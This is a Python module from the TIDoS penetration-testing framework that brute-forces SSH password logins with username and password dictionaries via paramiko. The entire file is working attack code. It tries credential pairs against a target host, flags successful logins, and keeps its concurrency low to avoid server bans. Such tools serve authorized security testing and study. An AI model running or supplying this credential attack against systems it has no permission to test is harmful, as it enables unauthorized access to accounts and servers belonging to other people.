#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of SSH logins (via paramiko)."""

from __future__ import annotations

import importlib.util
import logging

from core.methods import brute, modkit as kit
from core.methods.print import pbrute

info = "Brute force SSH credentials using dictionaries (password auth, via paramiko)."
searchinfo = "SSH Login Cracker"
# SSH daemons throttle/ban aggressively -> keep the default concurrency tiny.
properties = brute.options(port_default=22, threads_default=2)


def _try_login(ip, port, user, password, timeout):
    try:
        import paramiko
    except ImportError as e:
        raise ConnectionError(f"paramiko not installed ({e}); pip install paramiko") from e

    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ip, port=int(port), username=user,
                       password=password, timeout=timeout,
                       banner_timeout=timeout, auth_timeout=timeout,
                       allow_agent=False, look_for_keys=False)
        return True
    except paramiko.AuthenticationException:
        return False            # credentials rejected by the server
    except paramiko.SSHException as e:
        # e.g. "No authentication methods available" after a password reject
        if "authentication" in str(e).lower():
            return False
        raise ConnectionError(str(e)) from e
    except Exception as e:
        raise ConnectionError(str(e)) from e
    finally:
        try:
            client.close()
        except Exception:
            pass


def attack(target):
    pbrute("SSH")
    if importlib.util.find_spec("paramiko") is None:
        kit.bad("paramiko is not installed; run `pip install paramiko` to use sshbrute.")
        kit.Recorder(target, kit.BRUTE, "sshbrute")(
            "No valid credentials found (paramiko not installed).")
        return
    return brute.run(target, properties, proto="ssh", port_default=22,
              try_login=_try_login, lvl2="sshbrute", threads_default=2,
              service="SSH")
